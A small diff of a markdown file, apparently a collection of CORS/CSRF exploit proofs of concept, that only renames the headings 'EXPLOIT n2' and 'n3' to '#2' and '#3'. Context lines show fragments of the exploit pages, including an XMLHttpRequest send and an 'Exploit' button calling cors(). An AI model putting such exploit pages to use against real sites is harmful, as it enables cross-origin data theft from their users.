@@ -37,7 +37,7 @@ xhttp.send();
 </html>
 ```
 
-**EXPLOIT n2**
+**EXPLOIT #2**
 CSRF Button and alert popup.
 
 ```
@@ -64,7 +64,7 @@ xhttp.send();
 <button type="button" onclick="cors()">Exploit</button></div></body></html>
 ```
 
-**EXPLOIT n3**
+**EXPLOIT #3**
 CSRF Button and a simple server to listen.
 
 ```
